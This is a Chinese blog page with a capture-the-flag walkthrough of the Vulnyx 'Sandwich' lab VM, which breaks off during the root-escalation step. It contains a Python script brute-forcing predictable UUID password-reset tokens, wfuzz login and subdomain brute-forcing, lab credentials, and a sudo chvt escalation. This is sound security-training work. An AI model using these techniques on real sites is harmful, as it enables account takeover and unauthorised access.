<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog - 记录学习、生活" data-next-head=""/><meta property="og:description" content="Sunset的个人博客" data-next-head=""/><meta property="og:url" content="http://sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="http://sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog" data-next-head=""/><meta property="og:image:width" content="1200" data-next-head=""/><meta property="og:image:height" content="630" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="http://sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><title data-next-head="">重定向中...</title><meta name="description" content="Sunset的个人博客 - 记录生活和学习的点滴"/><meta name="keywords" content="sunset, blog, 技术博客, 编程, 个人网站"/><meta name="author" content="Sunset"/><link rel="canonical" href="http://sunsetaction.top"/><meta property="og:title" content="Sunset&#x27;s Blog"/><meta property="og:description" content="记录生活和学习的点滴"/><meta property="og:url" content="http://sunsetaction.top"/><meta property="og:type" content="website"/><link rel="preload" href="/_next/static/css/4e58b6bda73c4c7d.css" as="style"/><link rel="stylesheet" href="/_next/static/css/4e58b6bda73c4c7d.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-8cac0b4b405cede1.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-96105b52cb28f049.js" defer=""></script><script src="/_next/static/chunks/999-39f23ad0a9336d72.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-5313f237527ab061.js" defer=""></script><script src="/_next/static/F8SJ1HVtHRD6RHoOjYTwW/_buildManifest.js" defer=""></script><script src="/_next/static/F8SJ1HVtHRD6RHoOjYTwW/_ssgManifest.js" defer=""></script></head><body><link rel="preload" as="image" href="/images/logo.png"/><div id="__next"><div class="w-full" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 flex flex-col min-h-screen font-[LXGWWenKai]"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><img src="/images/logo.png" alt="Sunset" class="md:size-18 md:block hidden rounded-full"/><div><div class="flex items-center justify-center md:justify-start"><img src="/images/logo.png" alt="Sunset" class="size-10 rounded-xl md:hidden"/><h1 class="md:text-3xl text-xl font-extrabold text-red-700 ml-4">Sunset&#x27;s Blog</h1></div><div class="mt-2 grid grid-cols-4"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/" class="no-underline">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/writing" class="no-underline">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/about" class="no-underline">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap text-sm font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-3 has-[&gt;svg]:px-2.5"><a href="/search" class="no-underline">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"VulnyxShadwich","contentHtml":"\u003ch1\u003eShadwich\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://vulnyx.com/\"\u003ehttps://vulnyx.com/\u003c/a\u003e | Difficulty: \u003cstrong\u003eMedium\u003c/strong\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e\u003ccode\u003enmap\u003c/code\u003e 端口扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Sandwich nmap -sP 192.168.56.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-13 21:34 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.1\nHost is up (0.00063s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.2\nHost is up (0.00034s latency).\nMAC Address: 08:00:27:F9:79:E9 (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.60\nHost is up (0.00046s latency).\nMAC Address: 08:00:27:06:F4:3F (Oracle VirtualBox virtual NIC)\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.4\nHost is up.\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 256 IP addresses (4 hosts up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 1.96 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Sandwich nmap -sT -min-rate 10000 -p- 192.168.56.60\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-13 21:35 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.60\nHost is up (0.00066s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:06:F4:3F (Oracle VirtualBox virtual NIC)\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 5.88 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Sandwich nmap -sT -A -T4 -O -p 22,80 192.168.56.60 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-13 21:36 EDT\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 192.168.56.60\nHost is up (0.00060s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.62 ((Debian))\n|_http-server-header: Apache/2.4.62 (Debian)\nMAC Address: 08:00:27:06:F4:3F (Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.8\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.60 ms 192.168.56.60\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 238.63 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eWeb 渗透\u003c/h2\u003e\n\u003ch3\u003e信息收集\u003c/h3\u003e\n\u003cp\u003e访问 \u003ccode\u003eHTTP\u003c/code\u003e 采集指纹，将 \u003cstrong\u003eSandwich.nyx\u003c/strong\u003e 添加到 hosts\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e提供了注册，登录，忘记密码功能\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// register\n\nemail=admin@sandwich.nyx\u0026#x26;password=Aa118811\u0026#x26;register_action=1\n\n// login \n\nemail=admin@sandwich.nyx\u0026#x26;password=1212\u0026#x26;login_action=1\n\n//reset\n\nemail=sunset@sandwich.nyx\u0026#x26;reset_action=1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e注册必须使用 \u003ccode\u003esandwich.nyx\u003c/code\u003e 作为域名，但是注册用户提示：\u003ccode\u003eEmail is not recognized in the mail system.\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e爆破子域名\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Sandwich wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-110000.txt -u http://sandwich.nyx -H \u003cspan class=\"hljs-string\"\u003e'host:FUZZ.sandwich.nyx'\u003c/span\u003e --hl=225\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://sandwich.nyx/\nTotal requests: 114441\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload  \n=====================================================================\n\n000000005:   302        0 L      0 W        0 Ch        \u003cspan class=\"hljs-string\"\u003e\"webmail - webmail\"\u003c/span\u003e  \n^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...\n\nTotal \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 6.854331\nProcessed Requests: 74\nFiltered Requests: 73\nRequests/sec.: 10.79609\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e将 \u003ccode\u003ewebmail\u003c/code\u003e 添加到 \u003ccode\u003ehosts\u003c/code\u003e 中，并访问\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003ewebmail\u003c/code\u003e 中的注册是可以\u003cstrong\u003e正常注册\u003c/strong\u003e的了，这里创建了 \u003ccode\u003esunset@**s**andwich.nyx\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e后台可以发送信息以及退出登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e回到主页测试一下重置密码功能（这里权重最高的），注意：这里回到主页后还要重新在主页注册一次\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e密码重置测试\u003c/h3\u003e\n\u003cp\u003e输入邮箱后提示将重置连接发送到邮箱里\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看邮箱\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image5.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们多使用几次重置密码功能\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image6.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e这里就可以看出猫腻来了，两个 \u003ccode\u003eToken\u003c/code\u003e 只有第一部分是不一样的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003etoken=8dd7bb4e-3082-11f0-8069-08002706f43f\ntoken=40520e24-3082-11f0-8069-08002706f43f\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们重新创建一个用户，再看一下其 \u003ccode\u003eCookie\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image7.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003etoken=0ad5f4e8-308e-11f0-8069-08002706f43f\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e确实是只有的一部分是有用的，短时间内使用三次密码重置，前一部分分别为：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e78c0f144,78bf4420,78bd454e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e明显是递归增长的，那么假如我们第二个数据包请求\u003ccode\u003eadmin\u003c/code\u003e账户的密码重置，那么范围就一定在第一和第三个数据包的范围中，写脚本来进行爆破\u003c/p\u003e\n\u003ch3\u003e密码重置利用\u003c/h3\u003e\n\u003cp\u003e编写脚本来获取范围\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport requests\n\nurl = \u003cspan class=\"hljs-string\"\u003e'http://sandwich.nyx/index.php'\u003c/span\u003e\n\nnormal_data = {\n    \u003cspan class=\"hljs-string\"\u003e'email'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'a@sandwich.nyx'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'reset_action'\u003c/span\u003e:1\n}\nadmin_data = {\n    \u003cspan class=\"hljs-string\"\u003e'email'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'admin@sandwich.nyx'\u003c/span\u003e,\n    \u003cspan class=\"hljs-string\"\u003e'reset_action'\u003c/span\u003e:1\n}\n\nheader = {\n    \u003cspan class=\"hljs-string\"\u003e'Cookie'\u003c/span\u003e:\u003cspan class=\"hljs-string\"\u003e'PHPSESSID=ijkgvh1461gbpdg47l5c57nup5'\u003c/span\u003e\n}\n\nresponse = requests.post(url, data=normal_data,headers=header)\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(response.status_code,1)\nresponse = requests.post(url, data=admin_data,headers=header)\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(response.status_code,2)\nresponse = requests.post(url, data=normal_data,headers=header)\n\u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(response.status_code,3)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到范围\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ec4757516，c4722f6e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e根据范围循环生成 \u003ccode\u003eToken\u003c/code\u003e 请求重置密码\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eimport requests\n\nurl = \u003cspan class=\"hljs-string\"\u003e'http://sandwich.nyx/resetpassword.php'\u003c/span\u003e\n\nstart_hex = \u003cspan class=\"hljs-string\"\u003e'c4722f6e'\u003c/span\u003e\nend_hex = \u003cspan class=\"hljs-string\"\u003e'c4757516'\u003c/span\u003e\nstart = int(start_hex,16)\nend = int(end_hex,16)\nnum = 1\n\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e range(start,end):\n    data = {\n        \u003cspan class=\"hljs-string\"\u003e'token'\u003c/span\u003e : f\u003cspan class=\"hljs-string\"\u003e'{hex(i)[2:]}-308e-11f0-8069-08002706f43f'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'new_password'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'admin'\u003c/span\u003e,\n        \u003cspan class=\"hljs-string\"\u003e'confirm_password'\u003c/span\u003e : \u003cspan class=\"hljs-string\"\u003e'admin'\u003c/span\u003e\n    }\n\n    headers = {\n        \u003cspan class=\"hljs-string\"\u003e'Cookie'\u003c/span\u003e: \u003cspan class=\"hljs-string\"\u003e'PHPSESSID=s34jdcq4b9d9hl7v8dgsa8rha1'\u003c/span\u003e\n    }\n\n    response = requests.post(url, data=data, headers=headers)\n    \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'successfully'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e response.text:\n        \u003cspan class=\"hljs-built_in\"\u003ebreak\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(response.status_code,num)\n    num = num + 1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e也可以使用 \u003ccode\u003ewfuzz\u003c/code\u003e，用范围生成字典\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewfuzz -c -w dict.txt -u http://sandwich.nyx/resetpassword.php -H \u003cspan class=\"hljs-string\"\u003e'Cookie: PHPSESSID=ijkgvh1461gbpdg47l5c57nup5'\u003c/span\u003e -d \u003cspan class=\"hljs-string\"\u003e'token=FUZZ-3093-11f0-8069-08002706f43f\u0026#x26;new_password=admin\u0026#x26;confirm_password=admin'\u003c/span\u003e --hh=420\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e如何使用 \u003ccode\u003eadmin\u003c/code\u003e 作为密码进行登录\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image8.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e后台可以下载一份\u003ccode\u003eCSV\u003c/code\u003e文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image9.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch3\u003e密码爆破\u003c/h3\u003e\n\u003cp\u003e前面主页已经拿到了\u003ccode\u003eadmin\u003c/code\u003e账户，现在这些用户应该是在\u003ccode\u003ewebmail\u003c/code\u003e中使用的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Sandwich wfuzz -c -w ../../Dict/SecLists-2024.3/Passwords/xato-net-10-million-passwords-10000.txt -u http://webmail.sandwich.nyx/login.php -X POST -d \u003cspan class=\"hljs-string\"\u003e'email=matthygd_x@sandwich.nyx\u0026#x26;password=FUZZ'\u003c/span\u003e --sc=302\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://webmail.sandwich.nyx/login.php\nTotal requests: 10001\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload   \n=====================================================================\n\n000000001:   302        0 L      0 W        0 Ch        \u003cspan class=\"hljs-string\"\u003e\"qweasd\"\u003c/span\u003e     \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登陆进去后拿到一串密码对\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image10.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ematthygd_xy:tGCD9XIP03IHpSCDdoRu\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eSSH 可以使用该凭据登陆进去\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e➜  Sandwich ssh matthygd_xy@192.168.56.60   \nThe authenticity of host \u003cspan class=\"hljs-string\"\u003e'192.168.56.60 (192.168.56.60)'\u003c/span\u003e can\u003cspan class=\"hljs-string\"\u003e't be established.\nED25519 key fingerprint is SHA256:c8erXE4AHVkShqJ2nmaoh+8C3ZBq0gRr5iBxLnGVt9k.\nThis key is not known by any other names.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '\u003c/span\u003e192.168.56.60\u003cspan class=\"hljs-string\"\u003e' (ED25519) to the list of known hosts.\nmatthygd_xy@192.168.56.60'\u003c/span\u003es password: \nLinux sandwich 6.1.0-32-amd64 \u003cspan class=\"hljs-comment\"\u003e#1 SMP PREEMPT_DYNAMIC Debian 6.1.129-1 (2025-03-06) x86_64\u003c/span\u003e\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e each program are described \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the\nindividual files \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Mar 30 19:35:02 2025 from 192.168.1.181\nmatthygd_xy@sandwich:~$ \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权 - To ll104567\u003c/h2\u003e\n\u003cp\u003e家目录下 \u003ccode\u003euser.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ematthygd_xy@sandwich:~$ \u003cspan class=\"hljs-built_in\"\u003ecat\u003c/span\u003e user.txt \nc158efefab9bfd356fa8e9ec3c440da1\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e查看\u003ccode\u003esudo\u003c/code\u003e 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ematthygd_xy@sandwich:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e matthygd_xy on sandwich:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser matthygd_xy may run the following commands on sandwich:\n    (root) NOPASSWD: /bin/chvt\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003echvt\u003c/code\u003e命令允许用户直接从一个VT切换到另一个VT（虚拟控制台）\u003c/p\u003e\n\u003cp\u003e查看\u003ccode\u003e/dev\u003c/code\u003e 目录中的设备文件\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image11.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看当前用户登录用户所在 \u003ccode\u003etty\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ematthygd_xy@sandwich:~$ \u003cspan class=\"hljs-built_in\"\u003ewho\u003c/span\u003e\nll104567 tty20        2025-05-14 03:31\nmatthygd_xy pts/0        2025-05-14 11:41 (192.168.56.4)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e能看到用户\u003ccode\u003ell104567\u003c/code\u003e在\u003ccode\u003etty20\u003c/code\u003e ，切换到 \u003ccode\u003e20\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ematthygd_xy@sandwich:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e /bin/chvt 20\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e切换后在靶机页面就跳转到 \u003ccode\u003ell104567\u003c/code\u003e 的\u003ccode\u003eshell\u003c/code\u003e 了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接进行反弹 \u003ccode\u003eshell\u003c/code\u003e ，它的键盘映射太难受了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/VulnyxShadwich/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003e提权 - To Root\u003c/h2\u003e\n\u003cp\u003e查看 sudo 权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ell104567@sandwich:~$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e ll104567 on sandwich:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser ll104567 may run the following commands on sandwich:\n    (ALL) NOPASSWD: /opt/game.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ell104567@sandwich:~$ \u003cspan class=\"hljs-built_in\"\u003els\u003c/span\u003e -al /opt/game.sh \n-rwxr-xr-x 1 root root 1147 mar 30 19:49 /opt/game.sh\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e是一个猜数游戏\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-meta\"\u003e#!/bin/bash                    \u003c/span\u003e\n                                                                                                                  \n\u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e PATH=\u003cspan class=\"hljs-string\"\u003e\"/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"\u003c/span\u003e\n                                                         \nMAX=2000000\n                                                                                                                  \nATTEMPTS=$(/usr/bin/awk -v max=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$MAX\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'BEGIN {printf \"%d\", (log(max)/log(2) + 0.999999)}'\u003c/span\u003e)\n                                                         \n/bin/echo \u003cspan class=\"hljs-string\"\u003e\"Hello! What is your name?\"\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e NAME\n\nNUMBER=$(( ( RANDOM % MAX ) + \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e ))\n\n/bin/echo \u003cspan class=\"hljs-string\"\u003e\"Well, \u003cspan class=\"hljs-variable\"\u003e$NAME\u003c/span\u003e, I'm thinking of a number between 1 and \u003cspan class=\"hljs-variable\"\u003e$MAX\u003c/span\u003e.\"\u003c/span\u003e\n/bin/echo \u003cspan class=\"hljs-string\"\u003e\"You have \u003cspan class=\"hljs-variable\"\u003e$ATTEMPTS\u003c/span\u003e attempts to guess it.\"\u003c/span\u003e\n\nATTEMPTS_MADE=0\n\nSECRET_FILE=\u003cspan class=\"hljs-string\"\u003e\"/root/.ssh/id_rsa\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003ewhile\u003c/span\u003e [ \u003cspan class=\"hljs-variable\"\u003e$ATTEMPTS_MADE\u003c/span\u003e -lt \u003cspan class=\"hljs-variable\"\u003e$ATTEMPTS\u003c/span\u003e ]; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n  /bin/echo \u003cspan class=\"hljs-string\"\u003e\"Try to guess:\"\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eread\u003c/span\u003e GUESS\n\n  \u003cspan class=\"hljs-comment\"\u003e# Validate that the input is a valid number\u003c/span\u003e\n  \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e ! [[ \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$GUESS\u003c/span\u003e\"\u003c/span\u003e =~ ^[0-9]+$ ]]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n    /bin/echo \u003cspan class=\"hljs-string\"\u003e\"Please, enter a valid number.\"\u003c/span\u003e\n    \u003cspan class=\"hljs-built_in\"\u003econtinue\u003c/span\u003e\n  \u003cspan 